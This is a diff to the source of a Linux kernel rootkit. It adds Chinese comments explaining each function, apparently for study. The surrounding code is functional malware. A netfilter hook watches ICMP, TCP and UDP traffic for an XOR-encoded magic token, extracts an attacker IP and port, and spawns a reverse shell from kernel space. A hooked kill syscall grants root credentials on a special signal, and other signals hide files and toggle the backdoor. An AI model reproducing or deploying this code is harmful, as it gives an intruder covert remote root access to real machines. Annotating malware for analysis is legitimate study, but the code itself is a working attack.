@@ -1127,6 +1127,9 @@ struct shell_task
     char *port;
 };
 
+//==========================
+//异或功能函数
+//==========================
 void s_xor(char *arg, int key, int nbytes)
 {
     int i;
@@ -1134,6 +1137,9 @@ void s_xor(char *arg, int key, int nbytes)
         arg[i] ^= key;
 }
 
+//===========================
+//字符串转化为整型函数
+//===========================
 int atoi(char *str)
 {
     int i, result = 0;
@@ -1143,16 +1149,22 @@ int atoi(char *str)
     return result;
 }
 
+//============================
+//在用户态创建shell进程函数
+//============================
 void exec(char **argv)
 {
-    static char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+    static char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};//指定环境变量
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); //在用户态执行了一个shell
 }
 
+//=============================
+//任务参数处理函数
+//=============================
 void shell_execer(struct work_struct *work)
 {
     struct shell_task *task = (struct shell_task *)work;
-    char *argv[] = {task->path, "-a", task->ip, "-p", task->port, NULL};
+    char *argv[] = {task->path, "-a", task->ip, "-p", task->port, NULL};//指定参数
 
     exec(argv);
     //kfree(task->path);
@@ -1162,24 +1174,27 @@ void shell_execer(struct work_struct *work)
     //printk(KERN_INFO "finish shell execer\n");
 }
 
+//==============================
+//shell任务创建函数
+//==============================
 int shell_exec_queue(char *path, char *ip, char *port)
 {
     struct shell_task *task;
 
-    task = kmalloc(sizeof(*task), GFP_KERNEL);
+    task = kmalloc(sizeof(*task), GFP_KERNEL);//新建一个任务
 
     if (!task)
         return -1;
 
-    AR_INIT_WORK(&task->work, &shell_execer);
-    task->path = kstrdup(path, GFP_KERNEL);
+    AR_INIT_WORK(&task->work, &shell_execer);//初始化任务
+    task->path = kstrdup(path, GFP_KERNEL);//将路径传给任务
     if (!task->path)
     {
         kfree(task);
         return -1;
     }
 
-    task->ip = kstrdup(ip, GFP_KERNEL);
+    task->ip = kstrdup(ip, GFP_KERNEL);//将ip传给任务
     if (!task->ip)
     {
         kfree(task->path);
@@ -1187,7 +1202,7 @@ int shell_exec_queue(char *path, char *ip, char *port)
         return -1;
     }
 
-    task->port = kstrdup(port, GFP_KERNEL);
+    task->port = kstrdup(port, GFP_KERNEL);//将端口号传给任务
     if (!task->port)
     {
         kfree(task->path);
@@ -1196,10 +1211,12 @@ int shell_exec_queue(char *path, char *ip, char *port)
         return -1;
     }
 
-    return queue_work(work_queue, &task->work);
+    return queue_work(work_queue, &task->work);//创建要给内核线程，加入到工作队列
 }
 
-// 解析网络数据包
+//==============================================================
+//解析网络数据包，异或解密获取ip及端口
+//==============================================================
 void decode_n_spawn(const char *data)
 {
     int tsize;
@@ -1214,24 +1231,27 @@ void decode_n_spawn(const char *data)
 
     bzero(buf, tsize + 24);
     memcpy(buf, data, tsize + 24);
-    s_xor(buf, 11, strlen(buf));
-    tok = buf;
+    s_xor(buf, 11, strlen(buf));//异或解密数据段内容
+    tok = buf;//获取指令字符串
     strsep(&buf, " ");
-    ip = buf;
+    ip = buf;//获取指定ip
     strsep(&buf, " ");
-    port = buf;
+    port = buf;//获取指定端口号
     strsep(&buf, " ");
 
     if (!tok || !ip || !port)
         goto out;
 
     if (strcmp(token, tok) == 0 && atoi(port) > 0 && atoi(port) <= 65535 && strlen(ip) >= 7 && strlen(ip) <= 15)
-        shell_exec_queue(SHELL, ip, port);
+        shell_exec_queue(SHELL, ip, port);//将硬编码的shell路径，还有获取的ip、端口号传入shell开启函数
 
 out:
     kfree(p);
 }
 
+//==============================================================
+//钩子函数，对netfilter进行hook，检查包，符合条件则解析数据，开启后门
+//==============================================================
 unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer,
                                const struct net_device *in, const struct net_device *out,
                                int (*okfn)(struct sk_buff *))
@@ -1250,14 +1270,14 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
     int tsize;
     char _dt[strlen(TOKEN) + 12];
 
-    strcpy(token, TOKEN);
+    strcpy(token, TOKEN);//将硬编码的TOKEN值赋予token
     tsize = strlen(token);
 
-    s_xor(token, 11, tsize);
+    s_xor(token, 11, tsize);//对token进行异或
 
-    ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);
+    ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);//指针指向包头部
 
-    if (!ip_header)
+    if (!ip_header)//包头为空，将数据包返回上层
         return NF_ACCEPT;
 
     if (ip_header->protocol == IPPROTO_ICMP) // 检测icmp协议
@@ -1267,50 +1287,50 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
         if (!icmp_header)
             return NF_ACCEPT;
 
-        data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct icmphdr), sizeof(_dt), &_dt);
+        data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct icmphdr), sizeof(_dt), &_dt);//获取包头数据段内容
 
         if (!data)
             return NF_ACCEPT;
 
-        if ((icmp_header->code == ICMP_ECHO) && (memcmp(data, token, tsize) == 0))
+        if ((icmp_header->code == ICMP_ECHO) && (memcmp(data, token, tsize) == 0))//检查icmp报文类型是否为echo，同时检查异或以后的token是否与数据段前部分相等
         {
-            decode_n_spawn(data);
+            decode_n_spawn(data);//判断成功，确定该数据包为后门指令数据包，解析数据段
             return NF_DROP;
         }
     }
 
-    if (ip_header->protocol == IPPROTO_TCP)
+    if (ip_header->protocol == IPPROTO_TCP)//检测TCP协议
     {
         tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_tcph), &_tcph);
 
         if (!tcp_header)
             return NF_ACCEPT;
 
-        data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct tcphdr), sizeof(_dt), &_dt);
+        data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct tcphdr), sizeof(_dt), &_dt);//获取包头数据段内容
 
         if (!data)
             return NF_ACCEPT;
 
-        if (htons(tcp_header->dest) == TCPPORT && memcmp(data, token, tsize) == 0)
+        if (htons(tcp_header->dest) == TCPPORT && memcmp(data, token, tsize) == 0)//检查tcp端口是否为硬编码的端口，同时检查异或以后的token是否与数据段前部分相等
         {
             decode_n_spawn(data);
             return NF_DROP;
         }
     }
 
-    if (ip_header->protocol == IPPROTO_UDP)
+    if (ip_header->protocol == IPPROTO_UDP)//检测UDP协议
     {
         udp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_udph), &_udph);
 
         if (!udp_header)
             return NF_ACCEPT;
 
-        data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct udphdr), sizeof(_dt), &_dt);
+        data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct udphdr), sizeof(_dt), &_dt);//获取包头数据段内容
 
         if (!data)
             return NF_ACCEPT;
 
-        if (htons(udp_header->dest) == UDPPORT && memcmp(data, token, tsize) == 0)
+        if (htons(udp_header->dest) == UDPPORT && memcmp(data, token, tsize) == 0)//检查udp的端口是否为硬编码的端口，同时检查异或以后的token是否与数据段前部分相等
         {
             decode_n_spawn(data);
             return NF_DROP;
@@ -1319,6 +1339,9 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
     return NF_ACCEPT;
 }
 
+//===========================================================
+//后门注册函数，更改后门标志位并调用magic_packet_hook函数进行注册
+//===========================================================
 void regist_backdoor(void)
 {
     if (is_net_backdoor)
@@ -1336,6 +1359,9 @@ void regist_backdoor(void)
 #endif
 }
 
+//===========================================================
+//后门注销函数，更改后门标志位并取消注册
+//===========================================================
 void unregist_backdoor(void)
 {
     if (is_net_backdoor == 0)
@@ -1485,7 +1511,7 @@ asmlinkage int new_sys_kill(pid_t pid, int sig)
             hide_file_content = 1;
         break;
     case SIGROOT:
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29) // 获得root权限
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29) // 获得root权限，在低于2.6.30的版本中手动指定uid、gid等字段为0，再使用cap_set_full使当前进程获取最大的权能
         current->uid = 0;
         current->suid = 0;
         current->euid = 0;
@@ -1497,7 +1523,7 @@ asmlinkage int new_sys_kill(pid_t pid, int sig)
         cap_set_full(current->cap_inheritable);
         cap_set_full(current->cap_permitted);
 #else
-        commit_creds(prepare_kernel_cred(0));
+        commit_creds(prepare_kernel_cred(0));//在2.6.30版本直接使用commit_creds函数提权，commit_creds函数为当前的进程设置新的权限凭据。
 #endif
         break;
     case SIGBACKDOOR:
